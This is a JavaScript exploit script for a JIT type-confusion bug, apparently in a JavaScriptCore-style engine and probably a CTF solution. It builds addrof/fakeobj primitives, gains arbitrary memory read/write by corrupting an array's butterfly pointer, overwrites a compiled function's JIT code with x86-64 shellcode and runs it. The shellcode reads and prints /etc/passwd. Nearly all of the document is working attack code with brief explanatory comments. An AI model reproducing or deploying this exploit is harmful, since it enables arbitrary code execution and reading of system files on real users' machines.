function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}

// get compiled function
var func = makeJITCompiledFunction();

function gc() {
    for (let i = 0; i < 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

// Typr confusion here
function opt(obj) {
    for (let i = 0; i < 500; i++) {

    }

    let tmp = {a: 1};
    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {
        tmp.__proto__ = {};
        gc();
        obj.__proto__ = {};
        // Compiler are misleaded that obj and tmp shared same type
        return obj[k];
    }
}

opt({});

// Use Uint32Array to craft a controable memory
// Craft a fake object header
let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x0000004c;
fake_object_memory[1] = 0x01001600;
let fake_object = opt(fake_object_memory);

debug(describe(fake_object))

// Use JIT to stablized our attribute
// Attribute a will be used by addrof/fakeobj
// Attrubute b will be used by arbitrary read/write
for (i = 0; i < 0x1000; i ++) {
    fake_object.a = {test : 1};
    fake_object.b = {test : 1};
}

// get addrof
// we pass a pbject to fake_object
// since fake_object is inside fake_object_memory and represneted as integer
// we can use fake_object_memory to retrieve the integer value
function setup_addrof() {
    function p32(num) {
        value = num.toString(16)
        return "0".repeat(8 - value.length) + value
    }
    return function(obj) {
        fake_object.a = obj
        value = ""
        value = "0x" + p32(fake_object_memory[5]) + "" + p32(fake_object_memory[4])
        return new Int64(value)
    }
}

// Same
// But we pass integer value first. then retrieve object 
function setup_fakeobj() {
     return function(addr) {
        //fake_object_memory[4] = addr[0]
        //fake_object_memory[5] = addr[1]
        value = addr.toString().replace("0x", "")
        fake_object_memory[4] = parseInt(value.slice(8, 16), 16)
        fake_object_memory[5] = parseInt(value.slice(0, 8), 16)
        return fake_object.a
     }
}

addrof = setup_addrof()
fakeobj = setup_fakeobj()
debug("[+] set up addrof/fakeobj")
var addr = addrof({p: 0x1337});
assert(fakeobj(addr).p == 0x1337, "addrof and/or fakeobj does not work");
debug('[+] exploit primitives working');

// Use fake_object + 0x40 cradt another fake object for read/write
var container_addr = Add(addrof(fake_object), 0x40)
fake_object_memory[16] = 0x00001000;
fake_object_memory[17] = 0x01082007;

var structs = []
for (var i = 0; i < 0x1000; ++i) {
    var a = [13.37];
    a.pointer = 1234;
    a['prop' + i] = 13.37;
    structs.push(a);
}

// We will use victim as the butterfly pointer of contianer object
victim = structs[0x800]
victim_addr = addrof(victim)
victim_addr_hex = victim_addr.toString().replace("0x", "")
fake_object_memory[19] = parseInt(victim_addr_hex.slice(0, 8), 16)
fake_object_memory[18] = parseInt(victim_addr_hex.slice(8, 16), 16)

// Overwrite container to fake_object.b
container_addr_hex = container_addr.toString().replace("0x", "")
fake_object_memory[7] = parseInt(container_addr_hex.slice(0, 8), 16)
fake_object_memory[6] = parseInt(container_addr_hex.slice(8, 16), 16)
var hax = fake_object.b

var origButterfly = hax[1];

var memory = {
    addrof: addrof,
    fakeobj: fakeobj,

    // Write an int64 to the given address.
    // we change the butterfly of victim to addr + 0x10
    // when victim change the pointer attribute, it will read butterfly - 0x10
    // which equal to addr + 0x10 - 0x10 = addr
    // read arbiutrary value is almost the same
    writeInt64(addr, int64) {
        hax[1] = Add(addr, 0x10).asDouble();
        victim.pointer = int64.asJSValue();
    },

    // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
    write16(addr, value) {
        // Set butterfly of victim object and dereference.
        hax[1] = Add(addr, 0x10).asDouble();
        victim.pointer = value;
    },

    // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
    write(addr, data) {
        while (data.length % 4 != 0)
            data.push(0);

        var bytes = new Uint8Array(data);
        var ints = new Uint16Array(bytes.buffer);

        for (var i = 0; i < ints.length; i++)
            this.write16(Add(addr, 2 * i), ints[i]);
    },

    // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
    read64(addr) {
        // Set butterfly of victim object and dereference.
        hax[1] = Add(addr, 0x10).asDouble();
        return this.addrof(victim.pointer);
    },

    // Verify that memory read and write primitives work.
    test() {
        var v = {};
        var obj = {p: v};

        var addr = this.addrof(obj);
        assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");

        var propertyAddr = Add(addr, 0x10);

        var value = this.read64(propertyAddr);
        assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");

        this.write16(propertyAddr, 0x1337);
        assert(obj.p == 0x1337, "write16 does not work");
    },
};

memory.test();
debug("[+] limited memory read/write working");

// Get JIT code address
debug(describe(func))
var funcAddr = memory.addrof(func);
debug(`[+] shellcode function object @ ${funcAddr}`);
var executableAddr = memory.read64(Add(funcAddr, 24));
debug(`[+] executable instance @ ${executableAddr}`);
var jitCodeObjAddr = memory.read64(Add(executableAddr, 24));
debug(`[+] JITCode instance @ ${jitCodeObjAddr}`);
var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 368));
//var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 352));
debug(`[+] JITCode @ ${jitCodeAddr}`);

// Our shellcode
var shellcode = [0xeb, 0x3f, 0x5f, 0x80, 0x77, 0xb, 0x41, 0x48, 0x31, 0xc0, 0x4, 0x2, 0x48, 0x31, 0xf6,
                 0xf, 0x5, 0x66, 0x81, 0xec, 0xff, 0xf, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x89, 0xc7, 0x48, 
                 0x31, 0xd2, 0x66, 0xba, 0xff, 0xf, 0x48, 0x31, 0xc0, 0xf, 0x5, 0x48, 0x31, 0xff, 0x40, 
                 0x80, 0xc7, 0x1, 0x48, 0x89, 0xc2, 0x48, 0x31, 0xc0, 0x4, 0x1, 0xf, 0x5, 0x48, 0x31, 0xc0,
                 0x4, 0x3c, 0xf, 0x5, 0xe8, 0xbc, 0xff, 0xff, 0xff, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x41]

var s = "A".repeat(64);
var strAddr = addrof(s);
var strData = Add(memory.read64(Add(strAddr, 16)), 20);

// write shellcode
shellcode.push(...strData.bytes());
memory.write(jitCodeAddr, shellcode);

// trigger and get /etc/passwd
func();
print() 
